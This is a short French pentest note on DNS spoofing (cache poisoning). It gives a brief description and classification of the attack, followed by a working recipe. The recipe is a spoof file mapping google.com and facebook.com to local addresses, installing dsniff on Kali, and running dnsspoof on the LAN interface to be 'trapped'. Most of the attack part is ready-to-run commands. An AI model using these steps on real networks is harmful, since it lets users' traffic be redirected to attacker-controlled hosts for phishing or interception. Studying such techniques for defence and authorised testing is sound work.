# dns-spoof
## COUCHE 3
## COUCHE 7


### usurpation
### Escalade de privilège
### Dégradation de privilèges
### Déni de services,Divulgation des informations chiffrées

#### ATTAQUE = DNS_SERVER_SPOOFING

##### CONFIDENTIALITE
##### INTEGRITE
##### DISPONIBILITE

Description :
**DNS Spoofing** (ou **DNS Cache Poisoning**) est une attaque qui consiste à manipuler ou empoisonner le cache d'un serveur DNS, permettant ainsi à un attaquant de rediriger les utilisateurs vers des sites malveillants. Le mécanisme sous-jacent repose sur la manipulation des réponses DNS, où l'attaquant envoie de fausses informations DNS à une victime (un serveur ou un client), ce qui provoque un redirectionnement de la cible vers des adresses malveillantes.

Source :  https://github.com/nwhacks/dsniff


```
Vi dnsspoof_file
192.168.1.100 google.com 
192.168.1.101 facebook.com

```
Depuis une KALI

```
sudo apt-get install dsniff
sudo dnsspoof -i eth0 -f /path/to/dnsspoof_file

```
Remplacer eth0 par la carte étant sur le LAN à pieger
